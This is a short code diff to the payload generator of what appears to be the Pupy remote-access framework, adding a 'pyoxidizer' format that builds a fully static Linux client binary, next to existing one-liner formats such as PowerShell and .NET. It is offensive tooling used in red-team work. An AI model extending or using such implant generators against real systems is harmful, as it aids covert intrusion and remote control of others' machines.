@@ -493,7 +493,7 @@ def generate_binary_from_template(
         display, conf, target, shared=False, fmt=None):
 
     config = PupyConfig()
-
+    
     TEMPLATE_FMT = fmt or 'pupy{arch}{debug}-{pyver}.{ext}'
 
     CLIENTS = {
@@ -659,7 +659,7 @@ class InvalidOptions(Exception):
 PAYLOAD_FORMATS = [
     'client', 'py', 'pyinst', 'py_oneliner', 'ps1',
     'ps1_oneliner', 'csharp',
-    '.NET', '.NET_oneliner'
+    '.NET', '.NET_oneliner', 'pyoxidizer'
 ]
 
 
@@ -806,6 +806,8 @@ def pupygen(args, config, pupsrv, display):
                     'FORMAT': fmt, 'DESCRIPTION': description
                 } for fmt, description in ((
                     'client', 'generate client binary (linux/windows/apk/..)'
+                ), (
+                    'pyoxidizer', 'generate client binary using pyoxidizer template (linux only for now). The advantage of this method is that the binary is fully static and embeds a static python interpreter'
                 ), (
                     'py', 'fully packaged python file'
                 ), (
@@ -990,11 +992,15 @@ def pupygen(args, config, pupsrv, display):
         args.debug
     )
 
-    if args.format == 'client':
+    if args.format == 'client' or args.format=='pyoxidizer':
         display(Success('Generate client: {}/{}'.format(args.os, args.arch)))
 
+        fmt=None
+        if args.format=="pyoxidizer":
+            fmt='pupy{arch}-{pyver}.pyoxidizer.{ext}'
+
         data, filename, makex = generate_binary_from_template(
-            display, conf, target, shared=args.shared
+            display, conf, target, shared=args.shared, fmt=fmt
         )
 
         if not outpath:
